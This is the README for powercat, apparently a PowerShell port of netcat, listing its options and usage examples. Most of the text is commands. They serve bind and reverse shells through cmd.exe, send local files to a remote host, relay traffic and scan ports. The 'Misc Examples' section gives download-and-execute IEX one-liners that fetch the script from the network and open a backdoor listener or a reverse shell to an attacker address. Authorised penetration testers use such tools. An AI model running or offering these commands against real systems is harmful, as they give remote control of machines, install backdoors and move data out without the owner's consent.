#powercat

Netcat: The powershell version. (Powershell Version 2 and Later Supported)

### Parameters:
    -l    Listen for a connection.                             [Switch]
    -c    Connect to a listener.                               [String]
    -p    The port to connect to, or listen on.                [String]
    -e    Execute. (GAPING_SECURITY_HOLE)                      [String]
    -r    Relay. Format: "-r tcp:10.1.1.1:443"                 [String]
    -u    Transfer data over UDP.                              [Switch]
    -t    Timeout option. Default: 60                          [int32]
    -i    Input: Filepath (string), byte array, or string.
    -o    Output Type: "Host", "Bytes", or "String"            [String]
### General Usage Examples:
    Listen and Connect:
        powercat -l 443
        powercat -c 10.1.1.10 443
    Serve and Send Shells:
        powercat -l -e cmd.exe 443
        powercat -c 10.1.1.10 -e cmd.exe 443
    Output to a File:
        powercat -l -p 8000 -o "String" | Out-File C:\outputfile
        [IO.File]::WriteAllBytes("C:\outputfile",(powercat -l -p 8000 -o "Bytes"))
    Send a File:
        powercat -c 10.1.1.10 -p 443 -i "C:\inputfile"
        ([IO.File]::ReadAllBytes('C:\inputfile')) | powercat -c 10.1.1.10 -p 443
### powercat Relay Examples:
    Listener to Client Relay (TCP to TCP):
        powercat -l -p 8000 -r tcp:10.1.1.16:443
    Listener to Listener Relay (TCP to TCP):
        powercat -l -p 8000 -r tcp:4444
    Client to Listener Relay (TCP to TCP):
        powercat -c 10.1.1.16 -p 443 -r tcp:4444
    Client to Client Relay (TCP to TCP):
        powercat -c 10.1.1.16 -p 443 -r tcp:10.1.1.16:3389
    Listener to Client Relay (TCP to UDP):
        powercat -l -p 8000 -r udp:10.1.1.16:53
### Misc Examples:
    Download and Execute Powercat Backdoor Listener One-Liner:
        powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l 8000 -e cmd.exe"
    Download and Execute Powercat Reverse Shell One-Liner (Replace <Attacker IP>):
        powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c <ATTACKER IP> 443 -e cmd.exe"
    Basic TCP Port Scanner:
        (21,22,80,443) | % {powercat -c 10.1.1.10 -p $_ -t 1 -Verbose -d}
